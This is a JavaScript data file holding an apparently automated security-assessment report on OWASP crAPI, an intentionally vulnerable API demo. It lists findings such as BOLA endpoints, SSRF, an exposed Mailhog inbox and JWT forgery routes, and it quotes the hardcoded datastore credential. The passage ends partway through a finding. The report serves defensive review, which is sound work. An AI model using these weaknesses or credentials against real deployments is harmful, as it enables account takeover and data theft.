window.APD_DATA = {
  "meta": {
    "framework_version": "1.5.0",
    "domain_pack": {
      "name": "api-security",
      "version": ""
    },
    "run_id": "apd-20260527-crapi-owasp-api-top10",
    "synthesizer_version": "1.0.0",
    "specialists_skipped": [],
    "subject": "OWASP crAPI v1.1.5",
    "subject_tagline": "automotive B2C demonstration platform (Apache-2.0)",
    "date": "",
    "artifact_count": 9,
    "artifact_types": [
      "md×8",
      "file"
    ],
    "crown_jewels": [
      "user_credentials_store",
      "payment_methods_store",
      "pii_profile_store",
      "session_token_signing_keys",
      "authorization_decision_engine",
      "audit_log_store",
      "backup_artifact_store",
      "third_party_integration_secrets"
    ],
    "attacker_positions": [
      "unauthenticated_internet",
      "authenticated_low_priv_user_with_bola_target",
      "authenticated_user_seeking_authz_bypass",
      "compromised_user_session_token",
      "compromised_oauth_client_credentials",
      "compromised_third_party_integration",
      "compromised_admin_session",
      "supply_chain_attacker",
      "internal_lateral_attacker"
    ],
    "section_errors": {}
  },
  "summary": {
    "findings_total": 72,
    "findings_pre_dedup": 72,
    "cross_lens_merged_clusters": 0,
    "linked_clusters": 0,
    "bySeverity": {
      "critical": 5,
      "high": 29,
      "medium": 38,
      "low": 0,
      "info": 0
    },
    "byDisposition": {
      "gap": 54,
      "blocked": 17,
      "risk": 0,
      "uncertainty": 1,
      "ok": 0
    },
    "byTier": {
      "trustworthiness": 31,
      "scalability": 21,
      "auditability": 20
    },
    "capabilities_total": 22,
    "capabilities_pre_dedup": 22,
    "capabilitiesByMaturity": {
      "designed": 8,
      "implemented": 14,
      "tested": 0,
      "operationalized": 0
    },
    "contradictions": 0,
    "severity_disagreements": 0
  },
  "exec_summary": [
    "This APD gauntlet run reviews OWASP crAPI v1.1.5, an intentionally vulnerable automotive B2C demonstration platform built around the OWASP API Security Top 10 (2023). The api-security domain pack applies. The 9-artifact intake is candid about the 18+ vulnerabilities crAPI ships by design (BOLA on vehicle and mechanic-report, BFLA on admin video delete, mass-assignment on orders and videos, SQL/NoSQL injection on coupons, SSRF on contact_mechanic, JWT forgery via four documented patterns, broken OTP brute-force, chatbot prompt-injection); the gauntlet's role is to assess the operational consequences across all 9 APD goals rather than re-derive the vulnerability catalog.",
    "Across 9 specialists, 62 deduped findings emerged after merging 4 cross-lens clusters (JWT trust chain, chatbot admin credential, SSRF contact_mechanic, shared datastore credential). 5 critical, 25 high, 32 medium; 0 contradictions; 0 severity disagreements. 20 findings (32%) are dispositioned `blocked` on prerequisite evidence — consistent with the demo-intent gap-rich nature of the inputs (no audit, no backups, no SLO, no rotation procedures). The single highest-leverage architectural concern is the JWT trust chain: default private key shipped in repo + verifier accepts four documented forgery patterns produces cluster-wide forge-any-identity capability. The most strategically urgent gap is the total absence of audit-logging on consequential actions, which prevents forensic reconstruction of any incident."
  ],
  "posture_summary": {
    "trustworthiness": "Single critical (forgeable JWTs at platform scope) and three critical injection vectors (SQL, NoSQL, mass-assignment to credit) dominate; data-at-rest encryption and password-storage scheme are blocked on evidence.",
    "scalability": "Single-host SPOF on identity by design (demo intent); shared datastore credential collapses isolation; no refresh-token rotation, no rotation tooling for any credential, no circuit breakers on three outbound integrations.",
    "auditability": "Audit log is structurally absent across the platform; no actor attribution on any consequential action; mutable substrate awaits when audit is introduced; chatbot admin-credential breaks attribution even hypothetically."
  },
  "capabilities": [
    {
      "id": "conf-cap-c354ef8e",
      "tier": "trustworthiness",
      "goal": "confidentiality",
      "maturity": "designed",
      "title": "JWKS endpoint published over standard /.well-known/jwks.json path",
      "scope": "Mechanism in place. Significantly weakened by default private key in repo (merged-c829ffc8) and verifier multi-algo acceptance."
    },
    {
      "id": "conf-cap-0eea8c9d",
      "tier": "trustworthiness",
      "goal": "confidentiality",
      "maturity": "designed",
      "title": "Default Mailhog loopback binding (LISTEN_IP=127.0.0.1)",
      "scope": "Confirmed for documented default. NOT enforced — LISTEN_IP=0.0.0.0 override removes it."
    },
    {
      "id": "conf-cap-545144bc",
      "tier": "trustworthiness",
      "goal": "confidentiality",
      "maturity": "implemented",
      "title": "Datastores not exposed externally by default compose",
      "scope": "Confirmed for default Compose. NOT confirmed for Helm — NetworkPolicy not in values."
    },
    {
      "id": "conf-cap-95d55d61",
      "tier": "trustworthiness",
      "goal": "confidentiality",
      "maturity": "designed",
      "title": "TLS-capable mode (TLS_ENABLED=true) available across all services",
      "scope": "Mechanism exists. NOT confirmed production posture (real certs, TLS policy, mTLS)."
    },
    {
      "id": "conf-cap-e149eaec",
      "tier": "trustworthiness",
      "goal": "confidentiality",
      "maturity": "implemented",
      "title": "UUID identifier choice on vehicles (vs sequential integer)",
      "scope": "Confirmed for vehicles. Weakened in practice by leak via community recent-posts."
    },
    {
      "id": "intg-cap-4212a616",
      "tier": "trustworthiness",
      "goal": "integrity",
      "maturity": "implemented",
      "title": "OpenAPI specification published for the API surface",
      "scope": "Confirmed: spec exists, is served, is indexed. NOT confirmed: handler conformance."
    },
    {
      "id": "intg-cap-d764e156",
      "tier": "trustworthiness",
      "goal": "integrity",
      "maturity": "designed",
      "title": "RS256 asymmetric JWT mint (signing key not distributed to verifiers)",
      "scope": "Asymmetric design choice confirmed. Significantly weakened by default key in repo, multi-algo acceptance, no rotation."
    },
    {
      "id": "intg-cap-a070072a",
      "tier": "trustworthiness",
      "goal": "integrity",
      "maturity": "designed",
      "title": "Coupon claim-state column (intended per-user idempotency)",
      "scope": "Mechanism in place as column. Defeated by SQL injection in apply_coupon."
    },
    {
      "id": "intg-cap-c6f2bf49",
      "tier": "trustworthiness",
      "goal": "integrity",
      "maturity": "implemented",
      "title": "Rate limit on /identity/api/auth/v2/check-otp (partial coverage)",
      "scope": "Confirmed for v2/check-otp. NOT confirmed for any other auth surface."
    },
    {
      "id": "avail-cap-a85aeb7f",
      "tier": "trustworthiness",
      "goal": "availability",
      "maturity": "implemented",
      "title": "Per-service health.sh scripts with compose healthcheck wiring",
      "scope": "Confirmed for identity/workshop/community/mailhog. NOT confirmed for chatbot."
    },
    {
      "id": "avail-cap-5af461f2",
      "tier": "trustworthiness",
      "goal": "availability",
      "maturity": "implemented",
      "title": "Rate limit on /v2/check-otp (partial coverage)",
      "scope": "Confirmed v2 only; v3 and forget-password absent."
    },
    {
      "id": "avail-cap-26d2f293",
      "tier": "trustworthiness",
      "goal": "availability",
      "maturity": "implemented",
      "title": "Per-service compose resource limits prevent single-service runaway",
      "scope": "Confirmed for compose. NOT confirmed for Helm values."
    },
    {
      "id": "dist-cap-a2ac68b2",
      "tier": "scalability",
      "goal": "distributed",
      "maturity": "implemented",
      "title": "Microservice split with per-service container boundary",
      "scope": "Confirmed for compose. Boundary is process-only — not network-policy, not credential."
    },
    {
      "id": "dist-cap-452d749b",
      "tier": "scalability",
      "goal": "distributed",
      "maturity": "designed",
      "title": "Stateless application tier — JWT-based auth, no in-process session",
      "scope": "Confirmed for auth path. NOT confirmed for chatbot per-session LLM state via /genai/init."
    },
    {
      "id": "dist-cap-90969f60",
      "tier": "scalability",
      "goal": "distributed",
      "maturity": "implemented",
      "title": "JWKS endpoint at standard path — externalizable",
      "scope": "Endpoint exists at standard path. NOT confirmed any actual CDN/external replication."
    },
    {
      "id": "resil-cap-35c0088d",
      "tier": "scalability",
      "goal": "resilient",
      "maturity": "implemented",
      "title": "depends_on: service_healthy gating in compose enforces startup order",
      "scope": "Confirmed for compose. Helm equivalents not in input set."
    },
    {
      "id": "resil-cap-c6fc34e3",
      "tier": "scalability",
      "goal": "resilient",
      "maturity": "designed",
      "title": "Multi-provider chatbot architecture supports provider fallback (not yet implemented)",
      "scope": "Multi-provider support confirmed. NOT confirmed: automatic fallback on failure."
    },
    {
      "id": "ephem-cap-fd22b084",
      "tier": "scalability",
      "goal": "ephemeral",
      "maturity": "implemented",
      "title": "Image versioning on Postgres (postgres:14) and Mongo (mongo:4.4)",
      "scope": "Confirmed for Postgres/Mongo. NOT confirmed for ChromaDB (:latest)."
    },
    {
      "id": "auth-cap-125067f9",
      "tier": "auditability",
      "goal": "authenticity",
      "maturity": "implemented",
      "title": "RS256 asymmetric JWT mint + JWKS publication (OIDC-style identity provenance)",
      "scope": "Mint and JWKS-publication confirmed. Significantly weakened by default private key, multi-algo verifier, no rotation."
    },
    {
      "id": "auth-cap-9703a609",
      "tier": "auditability",
      "goal": "authenticity",
      "maturity": "designed",
      "title": "OpenAPI bearerAuth security scheme declared on every authenticated path",
      "scope": "Confirmed in spec. NOT confirmed in implementation per challenge 14 and INV-AUTH-001."
    },
    {
      "id": "nonrep-cap-81fb6e54",
      "tier": "auditability",
      "goal": "non_repudiation",
      "maturity": "implemented",
      "title": "Stdout logging at LOG_LEVEL=INFO across all services (operational, not auditable)",
      "scope": "Stdout streams exist. NOT confirmed: schema, content coverage, or consequential-action coverage."
    },
    {
      "id": "immut-cap-8e77982d",
      "tier": "auditability",
      "goal": "immutability",
      "maturity": "implemented",
      "title": "Pinned image versions on Postgres and Mongo",
      "scope": "Confirmed for Postgres/Mongo. NOT confirmed for ChromaDB, Mailhog, crAPI service images (digest not pinned)."
    }
  ],
  "strengths": [
    {
      "id": "conf-cap-545144bc",
      "title": "Datastores not exposed externally by default compose",
      "goal": "confidentiality",
      "maturity": "implemented",
      "caveats": [
        "Helm NetworkPolicy not in shipped values; segmentation is compose-only",
        "SSRF on contact_mechanic penetrates segmentation from any in-cluster service"
      ]
    },
    {
      "id": "intg-cap-4212a616",
      "title": "OpenAPI specification published for the API surface",
      "goal": "integrity",
      "maturity": "implemented",
      "caveats": [
        "Spec ≠ enforced schema; handlers accept inputs the spec doesn't document",
        "No CI gate verifying handler behavior matches the spec"
      ]
    },
    {
      "id": "auth-cap-125067f9",
      "title": "RS256 asymmetric JWT mint + JWKS publication (OIDC-style identity provenance)",
      "goal": "authenticity",
      "maturity": "implemented",
      "caveats": [
        "Default private key in repo (merged-c829ffc8)",
        "Verifier accepts multiple algorithms (merged-c829ffc8)",
        "No rotation procedure (ephem-30d38360)"
      ]
    },
    {
      "id": "dist-cap-452d749b",
      "title": "Stateless application tier — JWT-based auth, no in-process session",
      "goal": "distributed",
      "maturity": "designed",
      "caveats": [
        "Chatbot per-session key may introduce in-process state",
        "Theoretical replication; single-host SPOF unresolved (dist-1f123cef)"
      ]
    },
    {
      "id": "resil-cap-35c0088d",
      "title": "depends_on: service_healthy gating in compose enforces startup order",
      "goal": "resilient",
      "maturity": "implemented",
      "caveats": [
        "Healthchecks are shallow; do not gate on dependency health (avail-898bfad0)",
        "Startup-only; runtime degradation not addressed"
      ]
    },
    {
      "id": "intg-cap-a070072a",
      "title": "Coupon claim-state column (intended per-user idempotency)",
      "goal": "integrity",
      "maturity": "designed",
      "caveats": [
        "Idempotency check defeated by SQL injection (intg-ab3edc7a, intg-2aeb03f1)",
        "No DB-level unique constraint backing the application check"
      ]
    },
    {
      "id": "ephem-cap-fd22b084",
      "title": "Image versioning on Postgres (postgres:14) and Mongo (mongo:4.4)",
      "goal": "ephemeral",
      "maturity": "implemented",
      "caveats": [
        "ChromaDB pinned to :latest (ephem-edcc17b4)",
        "Mongo 4.4 past upstream EOL",
        "Image digests not pinned"
      ]
    }
  ],
  "findings": [
    {
      "id": "conf-fb05be4e",
      "title": "Vehicle-location endpoint discloses owner identity + GPS across users (BOLA #1)",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "GET /identity/api/v2/vehicle/{vehicleId}/location returns latitude/longitude and owner full name to any authenticated caller; vehicleId leaks via community recent-posts.",
      "detail": "The vehicle-location endpoint accepts any UUID and returns the owner's\nidentity plus precise GPS coordinates. Because the community\nrecent-posts feed serializes `vehicleid` alongside the author display\nname, enumeration is unnecessary — a low-privilege account can iterate\nevery leaked UUID and recover geolocation telemetry for arbitrary\ncrAPI users.\n\nThis is a Confidentiality finding because the architectural choice is\n\"endpoint returns the object regardless of caller identity.\" The\nidentity-verification half is in scope for Authenticity; the BOLA\nownership-check half is captured here via the data-disclosure lens.\n\nSeverity is high per \"BOLA / IDOR exposing PII or payment data bounded\nto a subset\" in the API security rubric, specifically because the\nblast radius is bounded only by the recent-posts feed size (and is\neffectively unbounded over time as new posts accrue). The disclosed\ndata is geolocation, which is itself sensitive personal data under\nGDPR Article 4(1).\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 BOLA #1",
          "excerpt": "endpoint accepts any UUID and returns latitude, longitude, and the owner's full name"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add ownership check on /vehicle/{vehicleId}/location and strip vehicleid from community recent-posts response."
      },
      "mappings": {
        "nist": [
          "AC-3",
          "AC-3(7)",
          "AC-4",
          "AC-6",
          "SC-8",
          "SI-15"
        ],
        "attack": [
          "T1213"
        ],
        "cwe": [
          "CWE-639",
          "CWE-285"
        ],
        "owasp_api": [
          "API1:2023",
          "API3:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "conf-5369e807",
      "title": "Mechanic-report endpoint discloses report bodies across users (BOLA #2)",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "GET /workshop/api/mechanic/mechanic_report?report_id=N uses sequential integer IDs with no ownership check.",
      "detail": "Mechanic-report IDs are sequential integers exposed via the\n`report_link` field returned by `/workshop/api/merchant/contact_mechanic`.\nThe report endpoint accepts the integer ID and returns the report body\nwith no check against the bearer token's user.\n\nThe disclosure surface is the report's body — vehicle problem\ndescription, mechanic comments, owner identifying data if the report\nincludes it. The data-taxonomy file in the active domain pack treats\n`mechanic_report.body` as PII when it includes owner-identifying\nfields.\n\nSeverity is high per the same BOLA clause as conf-fb05be4e; integer\nenumeration is materially worse than UUID enumeration because the\nattacker does not depend on a leak channel — they iterate from 1\nupward.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 BOLA #2",
          "excerpt": "Mechanic report IDs are sequential integers; the endpoint does not authorise the requester against the report owner"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add ownership check on mechanic_report and migrate report_id to UUID."
      },
      "mappings": {
        "nist": [
          "AC-3",
          "AC-4",
          "AC-6",
          "SI-15"
        ],
        "attack": [
          "T1213"
        ],
        "cwe": [
          "CWE-639",
          "CWE-285",
          "CWE-340"
        ],
        "owasp_api": [
          "API1:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "conf-c237e01d",
      "title": "User dashboard and video responses leak internal fields (BOPLA read-side, EDE #4/#5)",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Dashboard and /videos/{video_id} serialize underlying ORM objects, exposing fields the UI never consumes (e.g., conversion_params).",
      "detail": "Linked to intg-62ebf664 (write-side of same field name).",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 EDE #4 and #5",
          "excerpt": "user dashboard / profile endpoints serialize fields the UI does not display; video object response includes an internal property"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add explicit response-field allowlists to dashboard and video serializers."
      },
      "mappings": {
        "nist": [
          "AC-4",
          "SI-15",
          "SC-8"
        ],
        "attack": [
          "T1213"
        ],
        "cwe": [
          "CWE-200",
          "CWE-213"
        ],
        "owasp_api": [
          "API3:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "merged-c829ffc8",
      "title": "Default JWT signing key + multi-algorithm verifier accepts forgeries — cluster-wide identity trust broken",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "critical",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Merged: (a) services/identity/jwks.json ships private-key components by default, (b) verifier accepts alg:none, HS256-confusion, jku-fetch, kid-traversal; cluster auth is forgeable.",
      "detail": "Merged from three specialist findings (conf-c66f08cf Confidentiality,\nintg-15c04a1c Integrity, auth-09ae00ed Authenticity).\n\nThe architectural concern combines two failures: (a) the default\ninstall ships an RSA private key in `services/identity/jwks.json`\ncommitted to the repo, and (b) the verifier accepts at least four\ndocumented JWT forgery patterns. Either failure independently\nyields forge-any-identity capability; together they are critical\nauthentication-bypass.\n\nSeverity is critical per \"Forgeable session tokens at platform\nscope\" and \"Authentication bypass to high-privilege functions\nwith no factor required\" — both rubric clauses independently\napply.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§4 Authentication",
          "excerpt": "crAPI ships a default jwks.json containing the private key components (d, p, q, dp, dq, qi)"
        },
        {
          "artifact": "adrs/0002-jwt-with-rsa-and-jwks.md",
          "locator": "Consequences",
          "excerpt": "Algorithm-confusion (RS256 ↔ HS256) is the headline forgery vector"
        },
        {
          "artifact": "tech_plan.md",
          "locator": "§9 JWT vulnerabilities #15",
          "excerpt": "Four documented variants: RS256↔HS256 algorithm confusion, alg:none on dashboard, jku misuse, kid path traversal"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Generate fresh per-install keypair; pin alg:RS256; remove JWT_SECRET; allowlist jku; restrict kid to known set."
      },
      "mappings": {
        "nist": [
          "SC-12",
          "SC-12(1)",
          "SC-12(2)",
          "SC-13",
          "IA-2",
          "IA-2(1)",
          "IA-2(8)",
          "IA-5(2)",
          "SI-7",
          "SI-7(1)",
          "SC-23",
          "SC-23(3)",
          "SC-17",
          "SC-28(1)"
        ],
        "attack": [
          "T1552",
          "T1606",
          "T1550"
        ],
        "cwe": [
          "CWE-321",
          "CWE-347",
          "CWE-345",
          "CWE-22",
          "CWE-798",
          "CWE-287"
        ],
        "owasp_api": [
          "API2:2023",
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [
        null,
        null,
        null
      ],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 1
    },
    {
      "id": "conf-8f7c8c8d",
      "title": "Mailhog web UI on :8025 exposes every OTP and password-reset email when LISTEN_IP!=127.0.0.1",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "No authentication on Mailhog UI; documented LISTEN_IP=0.0.0.0 override removes the only barrier with no startup warning.",
      "detail": "Mailhog's web UI is the canonical inspection interface for captured\nOTP and password-reset emails. It has no built-in authentication. The\ndefault `LISTEN_IP=127.0.0.1` makes the port loopback-only, but the\ndocumented override `LISTEN_IP=0.0.0.0` exposes it to any network the\nhost is reachable on — with no warning in the setup documentation per\nADR-0003 invariants.\n\nAny party that reaches `:8025` reads every signup OTP, every password-\nreset OTP, and every email-change notification for the `example.com`\ndomain. Combined with email-only identity claim (S-6), this is an\naccount-takeover path that bypasses every authentication control\ncrAPI does have.\n\nSeverity is high per \"Defense-in-depth gap where a single\ncompensating control is the only barrier\" plus the consequential\naccount-takeover impact. The single barrier is `LISTEN_IP` posture; a\ndocumented override removes it.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "adrs/0003-mailhog-for-otp-delivery.md",
          "locator": "Consequences",
          "excerpt": "Mailhog has no built-in authentication on :8025"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Gate Mailhog UI behind basic-auth; emit startup warning on LISTEN_IP override."
      },
      "mappings": {
        "nist": [
          "AC-3",
          "AC-4",
          "SC-7",
          "IA-2",
          "SC-8"
        ],
        "attack": [
          "T1110"
        ],
        "cwe": [
          "CWE-306",
          "CWE-200"
        ],
        "owasp_api": [
          "API8:2023",
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "merged-44bdb663",
      "title": "Shared plaintext admin/crapisecretpassword on Postgres+Mongo, all services, repo-tracked",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Merged: single shared credential in compose env (Confidentiality disclosure) collapses datastore tier into one failure domain (Distributed) and enables direct DB write bypass of service-layer controls.",
      "detail": "Merged from conf-3e324699 and dist-c047a7c0. The plaintext\ncredential is both a credential-disclosure concern\n(Confidentiality) and a topology-of-trust concern (Distributed).\nThe same fix — per-service users + rotation — addresses both.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§6 Persistence and storage",
          "excerpt": "user/password admin / crapisecretpassword (hardcoded in deploy/docker/docker-compose.yml)"
        },
        {
          "artifact": "adrs/0004-dual-datastore-postgres-and-mongo.md",
          "locator": "Decision",
          "excerpt": "Both datastores accept the same admin credential. Every service that needs either datastore authenticates as admin"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Provision per-service Postgres+Mongo users with collection-scoped grants; remove static creds from compose; rotate per-deploy."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(1)",
          "IA-5(7)",
          "SC-12",
          "SC-28(1)",
          "AC-2",
          "AC-6",
          "AC-6(1)",
          "AC-6(5)",
          "SC-7"
        ],
        "attack": [
          "T1552"
        ],
        "cwe": [
          "CWE-798",
          "CWE-256",
          "CWE-250"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [
        null,
        null
      ],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 8
    },
    {
      "id": "merged-514507e6",
      "title": "SSRF on contact_mechanic with unbounded rate — cloud metadata + internal services exfiltration",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Merged: (a) no URL allowlist on outbound fetch, (b) no input validation on URL field, (c) no rate limit, (d) response body returned to caller.",
      "detail": "Merged from conf-cf457739 (Confidentiality / data exfiltration),\nintg-5c659bdb (Integrity / input validation), and avail-6af5aff7\n(Availability / rate limit). The single architectural fix —\ninput-validating typed URL with allowlist + per-token rate limit\n+ no response-body return — closes all three concerns.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 SSRF #11",
          "excerpt": "mechanic_api URL fetched server-side, returning the HTTP response body to the caller. No allowlist"
        },
        {
          "artifact": "tech_plan.md",
          "locator": "§9 No Rate Limit #6",
          "excerpt": "No throttle on the contact-mechanic submission endpoint; arbitrary outbound webhook fan-out"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add typed URL field with hostname allowlist + IP-resolution check; per-token rate limit (10/min); do not return fetched body to caller."
      },
      "mappings": {
        "nist": [
          "SC-7",
          "SC-7(5)",
          "AC-4",
          "SC-8(1)",
          "SI-10",
          "SC-5",
          "SC-5(1)",
          "SC-6",
          "SI-13"
        ],
        "attack": [
          "T1190",
          "T1499"
        ],
        "cwe": [
          "CWE-918",
          "CWE-441",
          "CWE-770",
          "CWE-400",
          "CWE-20"
        ],
        "owasp_api": [
          "API7:2023",
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [
        null,
        null,
        null
      ],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 7
    },
    {
      "id": "conf-bd613330",
      "title": "Encryption at rest unconfigured on Postgres, Mongo, ChromaDB",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "medium",
      "disposition": "blocked",
      "summary": "tech_plan and ADR-0004 explicitly state no encryption-at-rest is configured; specifics of remediation depend on deploy substrate.",
      "detail": "crAPI runs PostgreSQL 14 and MongoDB 4.4 in upstream images with no\nencryption-at-rest configuration. ChromaDB is similarly default. In\nthe Helm `values-pv.yaml` variant, volumes are host-mounted with no\nmention of underlying disk encryption.\n\nThe PII stored at rest includes user emails, names, phones, vehicle\nidentifiers, vehicle locations, mechanic-report bodies, and the\ngateway-service's faker-seeded SSN/card-number records. None of this\nis encrypted at the storage layer.\n\nThis is `blocked` because the remediation is materially different per\ndeploy substrate (LUKS on a Vagrant guest, EBS encryption on EC2,\npgcrypto for column-level on Postgres). The required prerequisite is\na declared deploy target. The architectural finding stands regardless\n— encryption-at-rest is absent.\n\nSeverity is medium per \"Defense-in-depth gap where a single\ncompensating control is the only barrier\" — the single barrier is\ndatastore-port reachability, which conf-3e324699 and the SSRF in\nconf-cf457739 both penetrate.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§10 Out-of-scope",
          "excerpt": "Encryption at rest. Not configured anywhere in the inputs"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Add encryption-at-rest posture to ADR-0004 with deploy-substrate-specific implementation."
      },
      "mappings": {
        "nist": [
          "SC-28",
          "SC-28(1)",
          "SC-12",
          "MP-4"
        ],
        "attack": [],
        "cwe": [
          "CWE-311",
          "CWE-312"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Target deploy substrate and disk-encryption posture",
        "Field-level vs full-disk encryption decision; key-management hierarchy"
      ]
    },
    {
      "id": "conf-b7aaa1e7",
      "title": "Password storage scheme unspecified in inputs",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "medium",
      "disposition": "blocked",
      "summary": "users.password storage is not described; modern API security demands argon2/scrypt/bcrypt with tuned parameters.",
      "detail": "The tech plan, architecture-index, and ADRs do not specify how\n`users.password` is stored. The intake brief flags this as an\nevidence gap. Modern API security demands a memory-hard hash\n(argon2id preferred; scrypt or bcrypt acceptable) with parameters\ntuned for the deploy substrate.\n\nWithout this evidence, the gauntlet cannot evaluate the password-\nhandling posture. The likelihood that the project ships\n`BCryptPasswordEncoder` defaults from Spring Security is high, but\n\"likely-OK\" is not the bar — block until the verifier can read the\nidentity service's password-config bean and confirm the hash, the\ncost factor, and the migration story.\n\nSeverity is medium because the failure mode is bounded: a database\ncompromise (already enabled by conf-3e324699) discloses password\nhashes; weak hashing turns offline disclosure into cleartext\nrecovery.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§5 Data model",
          "excerpt": "password (storage scheme unspecified in inputs)"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Document password-storage posture in ADRs or tech_plan and confirm via code review."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(1)",
          "SC-13"
        ],
        "attack": [],
        "cwe": [
          "CWE-916",
          "CWE-256",
          "CWE-326"
        ],
        "owasp_api": [
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Spring Security password-encoder bean configuration in identity",
        "argon2/scrypt/bcrypt cost factor in effect"
      ]
    },
    {
      "id": "conf-d760cafe",
      "title": "Gateway-service VIN-to-PII oracle exposes bulk PII and payment data",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "api.mypremiumdealership.com returns SSN/address/card_number deterministically seeded by VIN; basic-auth alone gates.",
      "detail": "The simulated dealership gateway returns a faker-seeded record per\nVIN — name, phone, SSN, address, card_number, card_owner_name,\ncard_expiry — with FNV-32a determinism. The gating control is HTTP\nbasic-auth with an undocumented credential (`S-5` in the threat\nmodel).\n\nIn the threat model's framing, the gateway is a cross-organization\nboundary. The deterministic seeding means *every deploy* yields the\nsame PII for the same VIN — useful pedagogically but materially\nworse than a randomized fake: any VIN leak (BOLA #1 leaks\n`vehicleId`; from there a VIN lookup in identity, then a gateway\nquery) becomes a bulk PII oracle with stable identity across deploys\n(re-identification surface).\n\nSeverity is high per \"BOLA / IDOR exposing PII or payment data\nbounded to a subset\". When combined with conf-fb05be4e (BOLA on\nvehicle UUIDs) and S-5 (basic-auth disclosure), the chain becomes\nmass-PII extraction; that chained exposure escalates toward\ncritical, captured separately in attack-path analysis (Phase 5.6).\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "architecture-index.md",
          "locator": "§api.mypremiumdealership.com",
          "excerpt": "Returns deterministically faked PII (name, phone, ssn, address, card_number) seeded from fnv32a(VIN)"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Replace deterministic VIN-seeding with per-deploy random; add rate-limit + audit on /owners."
      },
      "mappings": {
        "nist": [
          "AC-3",
          "AC-4",
          "AC-6",
          "SC-7",
          "IA-5"
        ],
        "attack": [
          "T1213"
        ],
        "cwe": [
          "CWE-639",
          "CWE-340",
          "CWE-200"
        ],
        "owasp_api": [
          "API1:2023",
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "conf-fffef009",
      "title": "JWT carries excessive claims — full PII profile likely embedded in 7-day bearer tokens",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "7-day TTL with no documented claim-minimization; standard Spring practice serializes full user record.",
